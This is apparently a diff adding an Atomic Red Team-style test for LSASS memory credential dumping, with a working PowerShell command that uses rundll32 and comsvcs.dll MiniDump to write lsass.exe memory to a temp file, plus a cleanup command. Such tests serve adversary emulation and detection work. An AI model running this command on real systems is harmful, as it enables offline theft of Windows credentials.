@@ -1,0 +1,12 @@
+#TechniqueName: OS Credential Dumping: LSASS Memory
+#AtomicTestName: Dump LSASS.exe Memory using comsvcs.dll
+#Description: The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with a built-in dll.&&Upon successful execution, you should see the following file created $env:TEMP\lsass-comsvcs.dmp.&
+#Language: ps1
+
+#commands
+C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass-comsvcs.dmp full
+
+
+#cleanup_commands
+Remove-Item $env:TEMP\lsass-comsvcs.dmp -ErrorAction Ignore
+
